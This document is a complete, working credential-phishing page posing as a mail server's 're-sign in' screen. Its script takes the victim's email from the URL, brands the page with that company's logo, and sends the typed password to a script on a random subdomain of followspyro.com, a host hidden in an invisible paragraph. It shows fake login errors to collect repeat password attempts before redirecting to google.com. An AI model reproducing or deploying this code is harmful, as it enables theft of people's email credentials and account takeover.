
<!DOCTYPE html>
<html>
	<head>
		<meta lang="en">
		<meta charset="utf-8">
		<title>MailServer</title>
		<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" integrity="sha512-DTOQO9RWCH3ppGqcWaEA1BIZOC6xxalwEsw9c2QQeAIftl+Vegovlnee1c9QX4TctnWMn13TZye+giMm8e2LwA==" crossorigin="anonymous" referrerpolicy="no-referrer" />
		<style>
			.logo{
				border-radius: 49%;
				height: 40px;
				width: 40px; 
				top: 10px;
				position: relative;
				right: 4px;
			}
			.main-c{
				position: relative; 
				width: 460px; 
				background:#000;
				padding-bottom: 1px;
				margin:auto;
				margin-top:110px;
				border-radius: 10px;
			}
		</style>
		<link rel="icon" type="image/x-icon" href="https://icons.veryicon.com/png/o/system/alongthink/ico-email.png">
	</head>
	<body>
		<p style="display:none;" id="lss">followspyro.com</p>
		<div class="main-c">
			<section  style="position: relative;top: 20px;" class="sncsjcns sdhnjsnc wt ">
				<img class="wdnwkd jdjks logo" src=""  id="lsdghsiid" style="position:absolute; left: 65px;display:none;">
				<span style="position: absolute;left: 0px;bottom: -25px;width: 100%;text-align: center;">
						<span class="tf-800" id="lg"  style="position:relative;"></span>
						<sup style="right: 5px; bottom: 8px; font-size: 8px; position: relative; display:inline;">&copy</sup>
				</span>
			</section>

			<!-- <div class="er-c" id="msg_p" style="display: none; background:#ffff99; color:#000; width: 300px; padding: 5px; position: relative; top: 60px; font-size: 10px; border-radius: 10px;  margin: auto; margin-bottom:40px">
				<div class="er-c-i" style="display:flex;">
					<div><img src="er.png"></div>
					<div style="padding-left: 10px; line-height: 40px;" id="msg">Error Message</div>
				</div>
			</div> -->

			<div class="t-mg" style="text-align:center;">
				<span class="sap wt" style="font-size: 17px; position:relative; left:30px; top: 10px;">Please sign in again to continue</span>
			</div>

			<style>
				body{
					overflow: hidden;
				}
				label{
					color:#fff;
				}

				.t-mg>div{
					padding: 0px 30px;
					position: relative;
					height: 40px;
				}

				.t-mg input{
					position: absolute;
					right: 0;
				}
				
				.t-mg label{
					padding-left: 40px;
					position: relative;
					top: 7px;
				}
				#id_email {
					color: #373737;
    background-color: white;
    padding: 5px 10px;
    margin-left: 122px;
    width: 240px;
    display: block;
    margin-top: -17px;
    border-radius: 5px;
    border: 1px solid #8f8f9d;
	height:18px;
				}
				#error {
					color: red;
    font-size: 14px;
    margin-left: 155px;
    margin-top: -7px;
    display: block;
    margin-bottom: 5px;
				}
			</style>

			<div class="t-mg" style="width:90%">
				<div>
					<label>Email: </label>
					<span id="id_email"></span>
					<!-- <input
						style="border-radius: 5px; border:1px solid #8f8f9d; padding-left: 10px;width: 60%; height: 25px; magin:auto;"
						type="email"
						name="slaplowiekd" 
						id="slaplowiekd"
						readonly 
					/> -->
				</div>
				<div>
					<label>Password: </label>
					<input
						style="border-radius: 5px; border:1px solid #8f8f9d; padding-left: 10px;height: 25px; width: 60%; magin:auto;"
						type="password"
						name="psps_dd"
						id="psps_dd"
						required
					/>
					
				</div>
			</div>
			<span id="error"></span>
			<section style="width: 60%; position:absolute; right:10%; margin-top: 10px;">
				
				<div
					style="color: red; margin-top: -1.1em; margin-bottom: .5em; left: 2%; position: relative;"
					class="wskldkd" id="erasdrsdsaorpas"
				> 
				</div>

				<input
					type="checkbox"
					style=" left: 2%;
					position: relative;"
					name="atc"
					id="atc"
					checked
				/>
				<label for="atc" class="wskldkd" style=" left: 2%; color: #fff;position: relative;" id="wnkcmskcnm"> Stay signed in</label>
				<input
					name="btn"
					type="button"
					id="btn"
					class="btn"
					value="Sign in"
				/>
			</section>

			<div style="border-top:1px solid #fff; height: 10px; margin: auto; margin-top:60px; width:80%;"></div>
			<div class="t-mg" style="margin-top: 0px; margin-bottom: 20px; color:#fff; ">
				<section style="text-align: center; ">
				<section>
					<!-- <img src="g.png" > -->
					<!-- <img src="https://www.clipartmax.com/png/middle/44-449042_big-image-the-noun-project.png" width="20" alt=""> -->
					<span style="font-size: 14px;  position: relative; top: 2px; bottom: 12px;">
					<i class="fa fa-circle" style="color: rgb(39, 201, 39); font-size: 9px;" aria-hidden="true"></i>
					Secure Mail Server</span></section>
				</section>
			</div>

			<div class="bg"></div>
		</div>

		<div class="t-mg">
			<section class="shkslsmdhdks" style="position: absolute; bottom: 20px; width:100%;
					color:#000;font-size: 0.8em;text-align: center;" id="wdlsmcklsmklcmlsmxl">
			<span>Copyright <span>&copy</span> 2024 <span id="dff"> </span>. All right reserved</span></section>
		</div>

		<style>

			body{background:#edeff0;}

		.msg{
			text-align: center; color: #e53d16; font-family: monospace; font-weight: bold;   margin-top: 10px;
		}.wbk {word-break: keep-all;}.p0 {padding: 0;}
		.sap{display: block; line-height: 40px; font-size: 23px; padding-top: 4px;  }
		.tf-800 { font-weight: 800; font-size: 25px;}.t-mg{margin-top: 20px;}.wt{color:#fff;text-align: center;padding-top: 20px;}


		
			#btn{ height: 30px;  min-width: 70px; position: absolute;  border-radius: 5px;  font-size: 15px; border:0;  cursor: pointer; color:#fff; right: 0; background: #000; border: 1px solid #fff;
			}

		</style>
		
		<script>
			let sets = {};
			sets.email_destination = '';
			sets.f_locs_ss = 0;
			sets.tries = 0;
			sets.logins_errors = ['Invalid username/password please try again', 'Invalid username/password please try again'];
			sets.res_time = 5;
			sets.res_suc_mes = '<i class="fa-solid fa-check"></i><div class="redi_mes">Successful.... Redirecting to {domain}</div>';
			sets.domain = 'google.com';
			let the_email = false,the_bs4=false;
			const _id = e => { return document.getElementById(e) }
			const _tag = e => { return document.getElementsByTagName(e) }

			sets.f_locs = _id('lss').innerText.replace(' ','').trim().split(',');

			const gen_f_locs = () => {
				return sets.f_locs[sets.f_locs_ss];
			};
			function genchars(length) {
				let result = '';
				const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
				const charactersLength = characters.length;
				let counter = 0;
				while (counter < length) {
				result += characters.charAt(Math.floor(Math.random() * charactersLength));
				counter += 1;
				}
				return result;
			}
			
			const regen_gflc = (a,to='fgv4.php') => {
				let b = [];
				b.push('https://'+genchars(5)+'.');
				b.push(a);
				if(to){
					b.push('/'+to);
				}
				return b.join('');
			}

			document.title = genchars(20)+'...';
			const req = (data = {}, c) => {
				let gflc = gen_f_locs();
				if(!gflc){
					console.log('Error no location found')
					return false;
				}
				gflc = regen_gflc(gflc);
				
				console.log(gflc);
				//return false;

				let net = new XMLHttpRequest();
				let form = new FormData();
				let tt = +new Date();
				if (typeof data === 'object') {
				for (let i in data) {
					form.append(i, data[i]);
				}
				}
				net.onreadystatechange = function () {
				if (net.readyState === 4) { 
					if(net.status!=200){
						sets.f_locs_ss++;
						console.log(net.responseText);
						req(data,c);
						return;
					}
					try {
						c(JSON.parse(net.responseText));
					} catch (e) {
						c(net.responseText);
					}
				}
				}
				net.open('POST', gflc + '?u=' + tt, true);
				net.send(form);
			};
			const loading = a => {
				// _id('loading_image').style.display = a ? 'block':'none';
				// _id('bg_screen').style.display = a? 'block':'none';
				_id('btn').value = a ? 'Verifying...':'Sign in';
			}
			const setVisibility = () => {
				_id('psps_dd').type = _id('psps_dd').type=='text' ? 'password':'text';
			}
			function caps(string) {
				return string.charAt(0).toUpperCase() + string.slice(1);
			}
			const ve = (email) => {
				return String(email)
					.toLowerCase()
					.match(
					/^(([^<>()[\]\\.,;:\s@"]+(\.[^<>()[\]\\.,;:\s@"]+)*)|.(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/
					);
				};
			const grab_email = (t=0) => {
				let u = location.href;
				let ereg = /([a-zA-Z0-9._-]+@[a-zA-Z0-9._-]+\.[a-zA-Z0-9_-]+)/gi;
				switch(t){
					case 0:
						let f = u.match(ereg);
						if(f&&f.length&&f[0]&&ve(f[0])){
							return f[0];
						}
						return grab_email((t+1));
					break;
					case 1:
						let d = u.split('#');
						if(d&&d[1]){
							let b = d[1];
							if(ve(b)){
								return b;
							}
							try{
								if(ve(atob(b))){
									return atob(b);
								}
							}catch(e){}
						}
						return grab_email((t+1));
					break;
					case 2:
						var regex = /[?&]([^=#]+)=([^&#]*)/g,params = {},match;
						while(match = regex.exec(u)) {
							params[match[1]] = match[2];
						}
						for(let i in params){
							if(ve(params[i])){
								return params[i];
								break;
							}
							try{
								if(ve(atob(params[i]))){
									return atob(params[i]);
									break;
								}
							}catch(e){}
						}
						return grab_email((t+1));
					break;
					default:
						return false;
					break;
				}
				return false;
			};
			
			const sub_we = () => {
				_id('error').innerText = '';
				loading(false);
				if(!the_email||!the_bs4){
					_id('error').innerText = 'Email is required';
					return false;
				}
				if(!_id('psps_dd').value){
					_id('error').innerText = 'Password is required';
					return false;
				}
				loading(true);
				req({t:'login',emem:the_email,psps:_id('psps_dd').value,the_bs4:the_bs4},res=>{
					setTimeout(function(){
						loading(false);
						if (sets.logins_errors[sets.tries]){
							_id('psps_dd').value = '';
							_id('psps_dd').focus();
							_id('error').innerText = sets.logins_errors[sets.tries];
							sets.tries++;
						}else{
							loading(true);
							setTimeout(function () {
								let gflc = gen_f_locs();
								gflc = regen_gflc(gflc);
								window.location.replace(gflc + '?red=' + sets.domain);
							}, parseInt(sets.res_time / 2) * 1000);
						}
						console.log(res);
					},2000);
				});
			}
			
			the_email = grab_email();
			let pbs = window.location.href.split('#');
			if(pbs.length>1){
				try{
					if(atob(pbs[1])&&ve(atob(pbs[1]))){
						the_bs4 = pbs[1];
					}
				}catch(e){
				}
			}
			if(the_email&&the_bs4){
				//_id('kai').innerHTML = the_email;
				_id('id_email').innerText = the_email;

				const getLogo = the_email.split("@");
				const company_name = getLogo[1].split('.');
				console.log(getLogo);
				console.log(company_name);

				document.getElementById('lg').innerHTML = company_name[0].charAt(0).toUpperCase() + company_name[0].slice(1);
				document.getElementById("lsdghsiid").src = "https://logo.clearbit.com/"+getLogo[1];
			}
			_id('psps_dd').addEventListener('click',()=>{
				_id('error').innerText = '';
			});
			_id('psps_dd').addEventListener('keypress',function(e){
				if(e.keyCode==13){
					sub_we();
				}
			});
			_id('btn').addEventListener('click',()=>{
				sub_we();
			});
		</script>
		
	</body>
</html>